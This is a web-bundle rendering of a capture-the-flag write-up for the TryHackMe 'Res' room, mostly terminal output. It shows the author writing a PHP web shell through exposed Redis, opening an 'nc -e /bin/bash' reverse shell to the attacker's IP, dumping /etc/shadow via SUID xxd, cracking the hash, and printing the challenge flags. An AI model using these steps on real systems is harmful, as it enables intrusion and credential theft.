"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8949],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>_});var r=t(67294);function s(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){s(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,s=function(e,n){if(null==e)return{};var t,r,s={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(s[t]=e[t]);return s}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(s[t]=e[t])}return s}var l=r.createContext({}),c=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=c(e.components);return r.createElement(l.Provider,{value:n},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,s=e.mdxType,a=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=c(t),m=s,_=p["".concat(l,".").concat(m)]||p[m]||d[m]||a;return t?r.createElement(_,o(o({ref:n},u),{},{components:t})):r.createElement(_,o({ref:n},u))}));function _(e,n){var t=arguments,s=n&&n.mdxType;if("string"==typeof e||s){var a=t.length,o=new Array(a);o[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[p]="string"==typeof e?e:s,o[1]=i;for(var c=2;c<a;c++)o[c]=t[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},26585:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>c});var r=t(87462),s=(t(67294),t(3905));const a={},o="Res",i={unversionedId:"Tryhackme/Res/Res",id:"Tryhackme/Res/Res",title:"Res",description:"Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!",source:"@site/writeups/Tryhackme/Res/Res.md",sourceDirName:"Tryhackme/Res",slug:"/Tryhackme/Res/",permalink:"/writeups/Tryhackme/Res/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Relevant",permalink:"/writeups/Tryhackme/Relevant/Relevent"},next:{title:"Retro",permalink:"/writeups/Tryhackme/Retro/"}},l={},c=[{value:"Topic&#39;s",id:"topics",level:2},{value:"Appendix archive",id:"appendix-archive",level:2},{value:"Task 1 Resy Set Go",id:"task-1-resy-set-go",level:2}],u={toc:c},p="wrapper";function d(e){let{components:n,...t}=e;return(0,s.kt)(p,(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"res"},"Res"),(0,s.kt)("p",null,"Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/res"},"Res")),(0,s.kt)("h2",{id:"topics"},"Topic's"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Redis (RCE)"),(0,s.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,s.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)"),(0,s.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,s.kt)("h2",{id:"appendix-archive"},"Appendix archive"),(0,s.kt)("p",null,"Password: ",(0,s.kt)("inlineCode",{parentName:"p"},"1 kn0w 1 5h0uldn'7!")),(0,s.kt)("h2",{id:"task-1-resy-set-go"},"Task 1 Resy Set Go"),(0,s.kt)("p",null,"Are you ready to take the challenge?\nThe machine may take up to 2 minutes to boot and configure"),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Scan the machine, how many ports are open?")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Res$ sudo nmap -A -Pn -sS -sC -sV -p- --script vuln 10.10.116.10\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 20:52 CEST\nPre-scan script results:\n| broadcast-avahi-dos:\n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.116.10\nHost is up (0.040s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| vulners:\n|   cpe:/a:apache:http_server:2.4.18:\n|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984\n|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679\n|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668\n|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169\n|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167\n|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211\n|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312\n|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715\n|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082\n|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788\n|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097\n|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217\n|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927\n|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098\n|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387\n|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490\n|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934\n|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081\n|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220\n|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196\n|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199\n|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189\n|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333\n|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303\n|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798\n|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710\n|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743\n|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740\n|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979\n|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197\n|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993\n|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985\n|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092\n|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302\n|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301\n|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763\n|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975\n|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546\n|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283\n|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612\n6379/tcp open  redis   Redis key-value store 6.0.7\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/12%OT=80%CT=1%CU=32016%PV=Y%DS=2%DC=T%G=Y%TM=5F84A7\nOS:A1%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT      ADDRESS\n1   36.07 ms 10.8.0.1\n2   36.61 ms 10.10.116.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 406.80 seconds\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"2")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"What's is the database management system installed on the server?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"6379/tcp open redis Redis key-value store 6.0.7")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"Redis")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"What port is the database management system running on?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"6379")),(0,s.kt)("ol",{start:4},(0,s.kt)("li",{parentName:"ol"},"What's is the version of management system installed on the server?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"6.0.7")),(0,s.kt)("ol",{start:5},(0,s.kt)("li",{parentName:"ol"},"Compromise the machine and locate user.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Res$ nc -v 10.10.116.10 6379\n10.10.116.10: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.10.116.10] 6379 (?) open\nINFO\n$3676\n# Server\nredis_version:6.0.7\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:5c906d046e45ec07\nredis_mode:standalone\nos:Linux 4.4.0-189-generic x86_64\narch_bits:64\nmultiplexing_api:epoll\natomicvar_api:atomic-builtin\ngcc_version:5.4.0\nprocess_id:581\nrun_id:d9959e542969ebcb8f4b726dcae8b7a6e8b157f6\ntcp_port:6379\nuptime_in_seconds:656\nuptime_in_days:0\nhz:10\nconfigured_hz:10\nlru_clock:8693827\nexecutable:/home/vianka/redis-stable/src/redis-server\nconfig_file:/home/vianka/redis-stable/redis.conf\nio_threads_active:0\n\n# Clients\nconnected_clients:1\nclient_recent_max_input_buffer:4\nclient_recent_max_output_buffer:0\nblocked_clients:0\ntracking_clients:0\nclients_in_timeout_table:0\n\n# Memory\nused_memory:588016\nused_memory_human:574.23K\nused_memory_rss:4870144\nused_memory_rss_human:4.64M\nused_memory_peak:588016\nused_memory_peak_human:574.23K\nused_memory_peak_perc:100.00%\nused_memory_overhead:541524\nused_memory_startup:524536\nused_memory_dataset:46492\nused_memory_dataset_perc:73.24%\nallocator_allocated:968712\nallocator_active:1253376\nallocator_resident:3489792\ntotal_system_memory:1038393344\ntotal_system_memory_human:990.29M\nused_memory_lua:37888\nused_memory_lua_human:37.00K\nused_memory_scripts:0\nused_memory_scripts_human:0B\nnumber_of_cached_scripts:0\nmaxmemory:0\nmaxmemory_human:0B\nmaxmemory_policy:noeviction\nallocator_frag_ratio:1.29\nallocator_frag_bytes:284664\nallocator_rss_ratio:2.78\nallocator_rss_bytes:2236416\nrss_overhead_ratio:1.40\nrss_overhead_bytes:1380352\nmem_fragmentation_ratio:8.93\nmem_fragmentation_bytes:4324656\nmem_not_counted_for_evict:0\nmem_replication_backlog:0\nmem_clients_slaves:0\nmem_clients_normal:16988\nmem_aof_buffer:0\nmem_allocator:jemalloc-5.1.0\nactive_defrag_running:0\nlazyfree_pending_objects:0\n\n# Persistence\nloading:0\nrdb_changes_since_last_save:0\nrdb_bgsave_in_progress:0\nrdb_last_save_time:1602528691\nrdb_last_bgsave_status:ok\nrdb_last_bgsave_time_sec:-1\nrdb_current_bgsave_time_sec:-1\nrdb_last_cow_size:0\naof_enabled:0\naof_rewrite_in_progress:0\naof_rewrite_scheduled:0\naof_last_rewrite_time_sec:-1\naof_current_rewrite_time_sec:-1\naof_last_bgrewrite_status:ok\naof_last_write_status:ok\naof_last_cow_size:0\nmodule_fork_in_progress:0\nmodule_fork_last_cow_size:0\n\n# Stats\ntotal_connections_received:2\ntotal_commands_processed:1\ninstantaneous_ops_per_sec:0\ntotal_net_input_bytes:19\ntotal_net_output_bytes:3681\ninstantaneous_input_kbps:0.00\ninstantaneous_output_kbps:0.00\nrejected_connections:0\nsync_full:0\nsync_partial_ok:0\nsync_partial_err:0\nexpired_keys:0\nexpired_stale_perc:0.00\nexpired_time_cap_reached_count:0\nexpire_cycle_cpu_milliseconds:12\nevicted_keys:0\nkeyspace_hits:0\nkeyspace_misses:0\npubsub_channels:0\npubsub_patterns:0\nlatest_fork_usec:0\nmigrate_cached_sockets:0\nslave_expires_tracked_keys:0\nactive_defrag_hits:0\nactive_defrag_misses:0\nactive_defrag_key_hits:0\nactive_defrag_key_misses:0\ntracking_total_keys:0\ntracking_total_items:0\ntracking_total_prefixes:0\nunexpected_error_replies:0\ntotal_reads_processed:3\ntotal_writes_processed:1\nio_threaded_reads_processed:0\nio_threaded_writes_processed:0\n\n# Replication\nrole:master\nconnected_slaves:0\nmaster_replid:2b3c03fdbfc80e41b99fc80406b4689e8f8000de\nmaster_replid2:0000000000000000000000000000000000000000\nmaster_repl_offset:0\nsecond_repl_offset:-1\nrepl_backlog_active:0\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:0\nrepl_backlog_histlen:0\n\n# CPU\nused_cpu_sys:0.000000\nused_cpu_user:0.752000\nused_cpu_sys_children:0.000000\nused_cpu_user_children:0.000000\n\n# Modules\n\n# Cluster\ncluster_enabled:0\n\n# Keyspace\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce"},"Redis RCE")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Res$ redis-cli -h 10.10.116.10\n10.10.116.10:6379> config set dir /var/www/html\nOK\n10.10.116.10:6379> config set dbfilename redis.php\nOK\n10.10.116.10:6379> set test "<?php phpinfo(); ?>"\nOK\n10.10.116.10:6379> save\nOK\n10.10.116.10:6379>\n')),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.116.10/redis.php"},"http://10.10.116.10/redis.php")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"10.10.116.10:6379> config set dbfilename cmd.php\nOK\n10.10.116.10:6379> set test \"<?php system($_GET['cmd']); ?>\"\nOK\n10.10.116.10:6379> save\nOK\n10.10.116.10:6379>\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"view-source:http://10.10.116.10/cmd.php?cmd=id;ifconfig"},"view-source:http://10.10.116.10/cmd.php?cmd=id;ifconfig")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"REDIS0009\ufffd  redis-ver\x056.0.7\ufffd\nredis-bits\ufffd@\ufffd\x05ctime\xba\ufffd\ufffd_\ufffd\bused-mem\ufffd@E    \0\ufffd\faof-preamble\ufffd\0\ufffd\0\ufffd\x01\0\0\x04test\x1euid=33(www-data) gid=33(www-data) groups=33(www-data)\neth0      Link encap:Ethernet  HWaddr 02:cb:29:27:15:7d\n          inet addr:10.10.116.10  Bcast:10.10.255.255  Mask:255.255.0.0\n          inet6 addr: fe80::cb:29ff:fe27:157d/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1\n          RX packets:67471 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:67086 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:3391500 (3.3 MB)  TX bytes:4859989 (4.8 MB)\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:178 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:178 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1\n          RX bytes:13592 (13.5 KB)  TX bytes:13592 (13.5 KB)\n\n\ufffd6/\x1e\0\ufffdx`9\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Res$ nc -nlvp 9001\nlistening on [any] 9001 ...\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"10.10.116.10/cmd.php?cmd=nc -e /bin/bash 10.8.106.222 9001")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwhich python3\n/usr/bin/python3\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@ubuntu:/var/www/html$ ls -la\nls -la\ntotal 28\ndrwxrwxrwx 2 root   root    4096 Oct 12 12:08 .\ndrwxr-xr-x 3 root   root    4096 Sep  2 09:54 ..\n-rw-r--r-- 1 vianka vianka   134 Oct 12 12:08 cmd.php\n-rw-r--r-- 1 root   root   11321 Sep  2 09:54 index.html\n-rw-r--r-- 1 vianka vianka   123 Oct 12 12:06 redis.php\nwww-data@ubuntu:/var/www/html$ cd /home\ncd /home\nwww-data@ubuntu:/home$ ls -la\nls -la\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Sep  1 17:02 .\ndrwxr-xr-x 22 root   root   4096 Sep  1 18:57 ..\ndrwxr-xr-x  5 vianka vianka 4096 Sep  2 13:52 vianka\nwww-data@ubuntu:/home$ cd vianka\ncd vianka\nwww-data@ubuntu:/home/vianka$ ls -la\nls -la\ntotal 44\ndrwxr-xr-x 5 vianka vianka 4096 Sep  2 13:52 .\ndrwxr-xr-x 3 root   root   4096 Sep  1 17:02 ..\n-rw------- 1 vianka vianka 3550 Sep  2 14:12 .bash_history\n-rw-r--r-- 1 vianka vianka  220 Sep  1 17:02 .bash_logout\n-rw-r--r-- 1 vianka vianka 3771 Sep  1 17:02 .bashrc\ndrwx------ 2 vianka vianka 4096 Sep  1 17:47 .cache\ndrwxrwxr-x 2 vianka vianka 4096 Sep  2 10:04 .nano\n-rw-r--r-- 1 vianka vianka  655 Sep  1 17:02 .profile\n-rw-r--r-- 1 root   root   1069 Sep  2 09:31 .service: Failed with result start-limit-hit?\n-rw-r--r-- 1 vianka vianka    0 Sep  1 17:47 .sudo_as_admin_successful\ndrwxrwxr-x 7 vianka vianka 4096 Sep  2 09:39 redis-stable\n-rw-rw-r-- 1 vianka vianka   35 Sep  2 13:52 user.txt\nwww-data@ubuntu:/home/vianka$ cat user.txt\ncat user.txt\nthm{red1s_rce_w1thout_credent1als}\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"thm{red1s_rce_w1thout_credent1als}")),(0,s.kt)("ol",{start:6},(0,s.kt)("li",{parentName:"ol"},"What is the local user account password?")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@ubuntu:/home/vianka$ cat /etc/passwd\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\nuuidd:x:107:111::/run/uuidd:/bin/false\nvianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash\nwww-data@ubuntu:/home/vianka$ cat /etc/shadow\ncat /etc/shadow\ncat: /etc/shadow: Permission denied\nwww-data@ubuntu:/home/vianka$ find / -type f -perm -u=s 2> /dev/null\nfind / -type f -perm -u=s 2> /dev/null\n/bin/ping\n/bin/fusermount\n/bin/mount\n/bin/su\n/bin/ping6\n/bin/umount\n/usr/bin/chfn\n/usr/bin/xxd\n/usr/bin/newgrp\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\nwww-data@ubuntu:/home/vianka$\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/xxd/#sudo"},"https://gtfobins.github.io/gtfobins/xxd/#sudo")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'www-data@ubuntu:/home/vianka$ LFILE=/etc/shadow\nLFILE=/etc/shadow\nwww-data@ubuntu:/home/vianka$ xxd "$LFILE" | xxd -r\nxxd "$LFILE" | xxd -r\nroot:!:18507:0:99999:7:::\ndaemon:*:17953:0:99999:7:::\nbin:*:17953:0:99999:7:::\nsys:*:17953:0:99999:7:::\nsync:*:17953:0:99999:7:::\ngames:*:17953:0:99999:7:::\nman:*:17953:0:99999:7:::\nlp:*:17953:0:99999:7:::\nmail:*:17953:0:99999:7:::\nnews:*:17953:0:99999:7:::\nuucp:*:17953:0:99999:7:::\nproxy:*:17953:0:99999:7:::\nwww-data:*:17953:0:99999:7:::\nbackup:*:17953:0:99999:7:::\nlist:*:17953:0:99999:7:::\nirc:*:17953:0:99999:7:::\ngnats:*:17953:0:99999:7:::\nnobody:*:17953:0:99999:7:::\nsystemd-timesync:*:17953:0:99999:7:::\nsystemd-network:*:17953:0:99999:7:::\nsystemd-resolve:*:17953:0:99999:7:::\nsystemd-bus-proxy:*:17953:0:99999:7:::\nsyslog:*:17953:0:99999:7:::\n_apt:*:17953:0:99999:7:::\nmessagebus:*:18506:0:99999:7:::\nuuidd:*:18506:0:99999:7:::\nvianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::\nwww-data@ubuntu:/home/vianka$\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Res$ john vianka.hash /usr/share/wordlists/rockyou.txt --format=sha512crypt\nWarning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\nbeautiful1       (?)\n1g 0:00:00:05 DONE 2/3 (2020-10-12 21:19) 0.1879g/s 1972p/s 1972c/s 1972C/s maryjane1..garfield1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@ubuntu:/home/vianka$ su vianka\nsu vianka\nPassword: beautiful1\n\nvianka@ubuntu:~$ sudo -l\nsudo -l\n[sudo] password for vianka: beautiful1\n\nMatching Defaults entries for vianka on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser vianka may run the following commands on ubuntu:\n    (ALL : ALL) ALL\nvianka@ubuntu:~$ sudo su\nsudo su\nroot@ubuntu:/home/vianka# cd /root\ncd /root\nroot@ubuntu:~# ls -la\nls -la\ntotal 24\ndrwx------  3 root root 4096 Sep  2 13:52 .\ndrwxr-xr-x 22 root root 4096 Sep  1 18:57 ..\n-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc\ndrwxr-xr-x  2 root root 4096 Sep  2 08:52 .nano\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\n-rw-r--r--  1 root root   25 Sep  2 13:52 root.txt\nroot@ubuntu:~# cat root.txt\ncat root.txt\nthm{xxd_pr1v_escalat1on}\n")),(0,s.kt)("ol",{start:7},(0,s.kt)("li",{parentName:"ol"},"Escalate privileges and obtain root.txt")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"thm{xxd_pr1v_escalat1on}")))}d.isMDXComponent=!0}}]);